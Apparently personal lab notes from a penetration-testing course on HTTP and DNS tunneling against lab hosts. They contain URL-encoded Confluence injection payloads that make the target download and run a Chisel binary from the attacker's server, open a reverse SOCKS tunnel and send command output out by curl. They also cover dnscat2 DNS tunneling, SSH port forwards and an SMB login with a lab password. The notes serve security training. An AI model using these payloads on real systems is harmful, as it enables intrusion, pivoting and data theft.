## 19.1. HTTP Tunneling
### 19.1.2. HTTP Tunneling with Chisel
#### Copying the Chisel binary to the Apache2 server folder
```Shell
cp $(which chisel) /var/www/html/
```
#### Starting Apache2
```Shell
systemctl start apache2
```
#### The Wget payload we use to download the Chisel binary to `/tmp/chisel` on CONFLUENCE01 and make it executable
```
wget 192.168.45.155/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```
In a cURL command:
```Shell
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.155.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```
#### The request for the Chisel binary hitting our Apache2 server
```Shell
tail -f /var/log/apache2/access.log
```
Output:
```
192.168.50.63 - - [03/Oct/2023:15:53:16 -0400] "GET /chisel HTTP/1.1" 200 8593795 "-" "Wget/1.20.3 (linux-gnu)"
```
#### Starting the Chisel server on port 8080.
```Shell
chisel server --port 8080 --reverse
```
#### Starting tcpdump to listen on TCP/8080 through the tun0 interface
```Shell
tcpdump -nvvvXi tun0 tcp port 8080
```
#### The Chisel client command we run from the web shell
```
/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
```
#### Starting the Chisel client using the Confluence injection payload
```Shell
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%27%29.start%28%29%22%29%7D/
```
However, nothing happens. We don't see any traffic hit our Tcpdump session, and the Chisel server output doesn't show any activity.
#### The error-collecting-and-sending command string
```
/tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/
```
#### The error-collecting-and-sending injection payload
```Shell
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.118.4:8080/%27%29.start%28%29%22%29%7D/
```
#### Downloading Chisel 1.81 from the main Chisel repo, and copying it to the Apache web root directory
```Shell
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
```

```Shell
gunzip chisel_1.8.1_linux_amd64.gz
```

```Shell
sudo cp ./chisel /var/www/html
```
#### The Wget payload executed within our cURL Confluence injection command, again
```Shell
curl http://192.168.186.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.155/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```
#### Trying to start the Chisel client using the Confluence injection payload, again
```Shell
curl http://192.168.186.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.155:8080%20R:socks%27%29.start%28%29%22%29%7D/
```
#### Install ncat
```Shell
apt install ncat
```
#### Passing an Ncat command to ProxyCommand to create an SSH connection through the chisel client
```Shell
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.186.215
```
### For the lab:
- Added `127.0.0.1   1080` to `/etc/proxychains.conf`
- Ran the following command: `proxychains ./chisel_exercise_client -i 10.4.186.215 -p 8008`
## 19.2. DNS Tunneling
### 19.2.1. DNS Tunneling Fundamentals
#### Looking at the basic configuration for our Dnsmasq server (after logging into their FELINEAUTHORITY server over SSH)
```Shell
cd dns_tunneling
```

```Shell
cat dnsmasq.conf
```
Output:
```
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp
```
This configuration ignores the `/etc/resolv.conf` and `/etc/hosts` files and only defines the auth-zone and auth-server variables. These tell Dnsmasq to act as the authoritative name server for the `feline.corp` zone
#### Starting Dnsmasq with the basic configuration
```Shell
sudo dnsmasq -C dnsmasq.conf -d
```
#### Do the command injection on CONFLUENCE01 and set up an SSH remote port forward to connect to PGDATABASE01
```Shell
ssh -N -R 127.0.0.1:2345:10.4.186.215:22 root@192.168.45.155
```
(On Confluence)

```Shell
ssh database_admin@127.0.0.1 -p 2345
```
(On Kali)
#### Starting Dnsmasq with the basic configuration
```Shell
sudo dnsmasq -C dnsmasq.conf -d
```
#### Start another shell on FELINEAUTHORITY and start tcpdump
```Shell
sudo tcpdump -i ens192 udp port 53
```
#### Checking the configured DNS server on PGDATABASE01
```Shell
resolvectl status
```
Note: It will not communicate directly w/ FELINEAUTHORITY---just MULTISERV03
#### Querying the DNS server directly
```Shell
nslookup exfiltrated-data.feline.corp 192.168.186.64.
```
#### Add the following line to dnsmasq
```
# TXT record
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else less useful.
```
#### Run dnsmasq
```Shell
sudo dnsmasq -C dnsmasq_txt.conf -d
```
#### Query the server from PGDATABASE01
```Shell
nslookup -type=txt www.feline.corp
```
This is one way to get data into an internal network
### 19.2.2. DNS Tunneling with dnscat2
#### Starting tcpdump on FELINEAUTHORITY to listen for packets on UDP port 53
```Shell
sudo tcpdump -i ens192 udp port 53
```
#### Starting the dnscat2 server on FELINEAUTHORITY
```Shell
dnscat2-server feline.corp
```
This indicates that the dnscat2 server is listening on all interfaces on UDP/53
#### Run the dnscat2 client on PGDATABASE01
```Shell
cd dnscat
```

```Shell
./dnscat feline.corp
```
The dnscat2 client reports that a session has been established
#### Check the connections on the server
```Shell
dnscat2-server feline.corp
```
#### Activate all the windows
```dnscat2
windows
```

```dnscat2
window -i 1
```

```dnscat2
?
```
#### Background our console session by pressing C+z and get information on the listen command
```dnscat2
listen --help
```
According to the help message output, listen operates much like ssh -L
#### Setting up a port forward from FELINEAUTHORITY to PGDATABASE01
```Shell
listen 127.0.0.1:4455 172.16.186.217:445
```
#### Connecting to HRSHARES's SMB server through the dnscat2 port forward
```Shell
smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
```
## Additional techniques from PG-Practice
#### Chisel client on Linux host
```Shell
./chisel client 192.168.45.250:8443 R:8000:127.0.0.1:8000
```
